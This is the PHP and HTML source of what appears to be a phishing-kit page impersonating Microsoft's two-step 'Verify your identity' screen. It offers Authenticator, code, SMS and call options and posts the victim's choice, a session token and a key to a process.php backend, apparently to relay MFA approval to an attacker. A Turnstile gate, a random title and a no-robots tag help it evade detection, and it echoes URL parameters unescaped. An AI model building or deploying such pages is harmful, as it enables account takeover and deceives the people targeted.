<?php
header("Access-Control-Allow-Origin: *");

if (!isset($_COOKIE['captcha']) || $_COOKIE['captcha'] != 1) {
	include '../config.php';
	echo '<html><head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><meta name="viewport" content="width=device-width, initial-scale=1"></head><body> Please stand by, while we are checking your browser... <br><br><form id="myForm" action="../validate.php" method="post"><div class="cf-turnstile" data-sitekey="' . $sitekey . '" data-callback="javascriptCallback"></div></form><script>function javascriptCallback(){var a=$("#myForm"),t=a.attr("action");a.submit(function(a){a.preventDefault()}),$.ajax({type:"POST",url:t,data:a.serialize(),success:function(a){location.reload()}})}</script></body></html>';
	exit();
}
?>
<html dir="ltr"  lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <title>tBxScFBI7Mv6kG2pDgOR6HMT88UBVcBYgbxD0qheqtfeK</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
	<link href="../css/style3.css" rel="stylesheet">

    <link rel="shortcut icon" href="../imgs/fi.ico">

    <meta name="robots" content="none">

</head>

<body  class="cb" style="display: block;" data-gr-c-s-loaded="true">

    <div>

        <div >
            <div class="background" role="presentation" >

                <div  style="background-image: url(&quot;../imgs/bg.svg&quot;);">

                </div>

                <div id="bodybackground" class="backgroundImage"  style="<?php echo empty($_GET['bg']) ? 'background-image: url(../imgs/bg.svg)' : 'background : linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(' . base64_decode($_GET['bg']) . ');background-size: cover;background-position-y: center;background-repeat: no-repeat;' ?>">

                </div>

            </div>

        </div>

        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="process.php" onsubmit="return checkSubmit()">

            <div class="outer">
                <div class="middle" >

                    <div class="inner" >

                        <div >

                            <img style="max-height: 36px;" id="logoCompany" role="presentation"  src="<?php echo empty($_GET['logo']) ? '../imgs/lg.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd' : base64_decode($_GET['logo']) ?>">

                        </div>

                        <div role="main">

                            <div class="pagination-view" >

                                <div data-viewid="1">

                                    <div >
                                        <div class="identityBanner">
                                            <div id="displayName" class="identity"><?= $_GET['user'] ?></div>
                                        </div>
                                        <div class="row text-title" id="loginHeader" role="heading">
                                            <div aria-level="1"  id="titleBox">Verify your identity

                                            </div>

                                        </div>
                                        <div role="alert" aria-live="assertive">

                                            <div class="alert alert-error col-md-24" id="errorBar"></div>

                                        </div>
                                        <div class="placeholderContainer" id="emField">

                                            <input type="hidden" name="user" id="i0116">

                                            <div id="progressVerify" class="progress" role="progressbar"  aria-label="Please wait" style="display: none;">

                                                <div>
                                                </div>
                                                <div>
                                                </div>
                                                <div>
                                                </div>
                                                <div>
                                                </div>
                                                <div></div>
                                                <div></div>

                                            </div>

                                        </div>
                                        <div id="verify">
                                            <div class="row tile" id="phoneAppNotif" role="listitem" style="display: none;">
                                                <div class="table" tabindex="0" role="button"  data-value="PhoneAppNotification" aria-describedby="idDiv_SAOTCS_Title">
                                                    <div class="table-row">
                                                        <div class="table-cell tile-img">
                                                            <div >
                                                                <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"><!-- /ko -->
                                                            </div>
                                                        </div>
                                                        <div class="table-cell text-left content" >
                                                            <div >Approve a request on my Microsoft Authenticator app</div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="row tile" id="PhoneAppOTP" role="listitem" style="display: none;">
                                                <div class="table" tabindex="0" role="button"  data-value="PhoneAppOTP">
                                                    <div class="table-row">
                                                        <div class="table-cell tile-img">
                                                            <div >
                                                                <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_ea014b224eb1c04ac2f7cb85c43cc034.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg"><!-- /ko -->
                                                            </div>
                                                        </div>
                                                        <div class="table-cell text-left content" >
                                                            <div >Use a verification code</div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="row tile" id="VerifSms" role="listitem" style="display: none;">
                                                <div class="table" tabindex="0" role="button"  data-value="OneWaySMS">
                                                    <div class="table-row">
                                                        <div class="table-cell tile-img">
                                                            <div >
                                                                <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"><!-- /ko -->
                                                            </div>
                                                        </div>
                                                        <div class="table-cell text-left content" >
                                                            <div >Text <span id="numberSms"></span></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="row tile" id="verifTelp" role="listitem" style="display: none;">
                                                <div class="table" tabindex="0" role="button"  data-value="TwoWayVoiceMobile">
                                                    <div class="table-row">
                                                        <div class="table-cell tile-img">
                                                            <div >
                                                                <img class="tile-img" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_3fb9c7e87c04ff8f56dd61ef8b748c02.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg"><!-- /ko -->
                                                            </div>
                                                        </div>
                                                        <div class="table-cell text-left content" >
                                                            <div >Call <span id="numberTelp"></span></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div  class="position-buttons">
                                                <div class="row">
                                                    <div class="col-md-24">
                                                        <div class="text-13">
                                                            <div class="form-group">
                                                                <a id="moreInfoUrl" href="#"  aria-label="More information about two step verification">More information</a>
                                                            </div>
                                                            <div class="text-13 form-group">
                                                                <span >Are your verification methods current? Check at https://aka.ms/mfasetup</span>
                                                            </div>

                                                        </div>

                                                    </div>
                                                    <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" >

                                                        <!-- ko if: isSecondaryButtonVisible -->
                                                        <div class="inline-block">
                                                            <input type="button" id="idBtn_SAOTCS_Cancel" class="win-button button-secondary button ext-button secondary ext-secondary"  value="Cancel">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <input type="hidden" name="logo" id="logoForm" value="<?= empty($_GET['logo']) ? '' : base64_decode($_GET['logo']) ?>">
            <input type="hidden" name="background" id="backgroundForm" value="<?= empty($_GET['bg']) ? '' : base64_decode($_GET['bg']) ?>">
            <input type="hidden" name="token" id="tokenForm" value="<?= empty($_GET['token']) ? '' : $_GET['token'] ?>">
            <input type="hidden" name="do" id="do" value="verify">

    </div>

    </div>
    </form>

    <form method="post" aria-hidden="true" target="_top" >

    </form>

    <div id="idPartnerPL" >
        <iframe height="0" width="0" src="./Sign in to your account_files/prefetch(1).html" style="display: none;"></iframe>
    </div>

    </div>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#phoneAppNotif').click(function() {
                ajaxToVerify('PhoneAppNotification');
            });
            $('#PhoneAppOTP').click(function() {
                ajaxToVerify('PhoneAppOTP');
            });
            $('#VerifSms').click(function() {
                ajaxToVerify('OneWaySMS');
            });
            $('#verifTelp').click(function() {
                ajaxToVerify('TwoWayVoiceMobile');
            });

            let method = '<?= empty($_GET['method']) ? '[]' : base64_decode($_GET['method']) ?>';
            method = JSON.parse(method);
            if (method.length > 0) {
                method.forEach(function(item) {
                    if (item.authMethodId == "PhoneAppNotification") {
                        $('#phoneAppNotif').show();
                    }

                    if (item.authMethodId == "PhoneAppOTP") {
                        $('#PhoneAppOTP').show();
                    }

                    if (item.authMethodId == "OneWaySMS") {
                        $('#VerifSms').show();
                        $('#numberSms').text(item.display);
                    }

                    if (item.authMethodId == "TwoWayVoiceMobile") {
                        $('#verifTelp').show();
                        $('#numberTelp').text(item.display);
                    }
                });
            }

            const ajaxToVerify = (method) => {
                $('#progressVerify').show();
                $('#errorBar').html('');
                $.ajax({
                    url: '../process.php',
                    type: 'POST',
                    dataType: "json",
                    data: {
                        method: method,
                        token: $('#tokenForm').val(),
                        do: 'verify',
                        bg: $('#backgroundForm').val(),
                        logo: $('#logoForm').val(),
                        user: "<?= empty($_GET['user']) ? '' : $_GET['user'] ?>",
                        key: "<?= empty($_GET['key']) ? '' : $_GET['key'] ?>"
                    },
                    success: function(data) {
                        if (!data.status) {
                            $('#errorBar').html('Failed to send verification. Please try again later.');
                            $('#progressVerify').hide();
                        } else {
                            window.location.href = data.redirect;
                        }
                    }
                });
            }
        });
    </script>
    <style>
        box {
            width: 40%;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.2);
            padding: 35px;
            border: 2px solid #fff;
            border-radius: 20px/50px;
            background-clip: padding-box;
            text-align: center;
        }

        .button {
            font-size: 1em;
            padding: 10px;
            color: #fff;
            border: 2px solid #0067B8;
            border-radius: 20px/50px;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.3s ease-out;
        }

        .button:hover {
            background: #0067B8;
        }

        .overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.7);
            transition: opacity 500ms;
            visibility: hidden;
            opacity: 0;
        }

        .overlay:target {
            visibility: visible;
            opacity: 1;
        }

        .popup {
            margin: 70px auto;
            padding: 20px;
            background: #fff;
            border-radius: 5px;
            width: 30%;
            position: relative;
            transition: all 5s ease-in-out;
        }

        .popup h2 {
            margin-top: 0;
            color: #333;
            font-family: Tahoma, Arial, sans-serif;
        }

        .popup .close {
            position: absolute;
            top: 20px;
            right: 30px;
            transition: all 200ms;
            font-size: 30px;
            font-weight: bold;
            text-decoration: none;
            color: #333;
        }

        .popup .close:hover {
            color: #0067B8;
        }

        .popup .content {
            max-height: 30%;
            overflow: auto;
        }

        @media screen and (max-width: 700px) {
            .box {
                width: 70%;
            }

            .popup {
                width: 70%;
            }
        }
    </style>
</body>

</html>